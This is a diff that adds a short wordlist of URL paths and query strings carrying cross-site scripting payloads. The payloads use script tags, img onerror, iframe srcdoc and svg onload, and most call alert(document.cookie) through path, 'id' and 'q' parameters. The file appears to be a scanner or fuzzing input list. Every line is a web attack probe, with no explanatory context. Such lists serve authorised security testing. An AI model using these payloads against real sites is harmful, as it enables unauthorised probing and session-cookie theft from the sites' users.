@@ -1,0 +1,15 @@
+/<script>alert(
+/?id=<script>alert(
+/?id=<center><a+href%3D
+/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/?id=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
+/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
+/%22%3E%3Csvg/onload=alert(document.cookie)%3E
+/?id=%22%3E%3Csvg/onload=alert(document.cookie)%3E
+/?q=<center><a+href%3D
+/?q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/?q=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/?q=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
